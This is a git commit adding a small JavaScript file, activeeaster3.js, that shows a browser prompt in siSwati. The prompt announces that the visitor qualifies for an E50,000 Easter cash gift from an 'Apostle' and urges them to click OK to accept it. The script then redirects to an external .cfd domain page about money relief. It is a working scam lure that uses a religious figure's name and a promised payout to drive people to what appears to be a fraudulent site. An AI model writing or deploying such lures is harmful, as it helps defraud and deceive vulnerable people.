5b13cd8da02111173162ee0dc18dff2fb8314c60
Help-All <imaobongumoh637@gmail.com>
2026-04-03 02:07:10 +0100

    Create activeeaster3.js

---
+++ activeeaster3.js
@@ -0,0 +1,10 @@
+var password = 'E50,000';
+
+password = prompt(
+  'Halala, uyafaneleka kutsi Uthole APOSTLE JUSTICE DLAMINI E50,000 Usito Lwemali Yeli-Easter. Chafata OK ute uyemukela masinyane.',
+  'E50,000'
+);
+
+if (password !== 'E50,000') {
+    location.href = 'https://getin-ofer.cfd/Lusito-lwemali.html';
+}
